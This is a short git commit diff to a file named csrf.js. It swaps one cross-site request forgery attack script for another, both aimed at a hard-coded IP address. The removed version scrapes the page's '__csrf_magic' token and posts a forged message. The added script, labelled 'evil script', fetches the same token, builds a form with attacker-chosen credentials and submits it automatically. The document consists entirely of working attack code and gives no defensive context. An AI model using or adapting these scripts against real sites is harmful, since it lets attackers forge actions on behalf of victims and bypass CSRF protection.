b085b113b06d432e5bae205a04d29d735bf8eb31
Bagul3 <vandershannon@gmail.com>
2018-07-06 01:07:14 +0100

    Update csrf.js

--- csrf.js
+++ csrf.js
@@ -1,34 +1,28 @@
-function readBody(xhr) {
- var data;
- if (!xhr.responseType || xhr.responseType === “text”) {
- data = xhr.responseText;
- } else if (xhr.responseType === “document”) {
- data = xhr.responseXML;
- } else {
- data = xhr.response;
- }
- var parser = new DOMParser();
- var resp = parser.parseFromString(data, “text/html”);
- token = resp.getElementsByName(‘__csrf_magic’)[0].value; //grab first available token
-csrf(token);
- return data;
+<script>
+console.log("Running evil script");
+var csrfProtectedPage = 'https://72.1.207.178/index.php';
+var csrfProtectedForm = 'form';
+
+// get valid token for current request
+var html = get(csrfProtectedPage);
+document.body.innerHTML = html;
+var form = document.getElementById(csrfProtectedForm);
+var token = document.getElementsByName("__csrf_magic")[0].value;
+
+// build form with valid token and evil credentials
+document.body.innerHTML
+        += '<form action="' + csrfProtectedPage + '" method="POST">'
+        + '<input type="hidden" name="token" value="' + token + '">'
+        + '<input id="username" name="name" value="xl7dev">'
+        + '</form>';
+
+// submit form
+document.forms[0].submit();
+
+function get(url) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", url, false);
+    xmlHttp.send(null);
+    return xmlHttp.responseText;
 }
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function () {
- if (xhr.readyState == 4) {
- response = readBody(xhr);
- }
-}
-xhr.open(‘GET’, ‘https://72.1.207.178/index.php’, true);
-xhr.send(null);
-function csrf(token) {
- var sendWidgetModel = {
- “toEmail”: ‘john.doe@example.com’,
- “widgetMessage”: “Goodbye, John. We are not friends.”,
- };
- var x1 = new XMLHttpRequest();
- x1.open(“POST”, “https://72.1.207.178/index.php");
- x1.setRequestHeader(“Content-Type”, “application/json; charset=utf-8”);
- x1.setRequestHeader(‘__csrf_magic’, token);
- x1.send(JSON.stringify(sendWidgetModel));
-}
+</script>
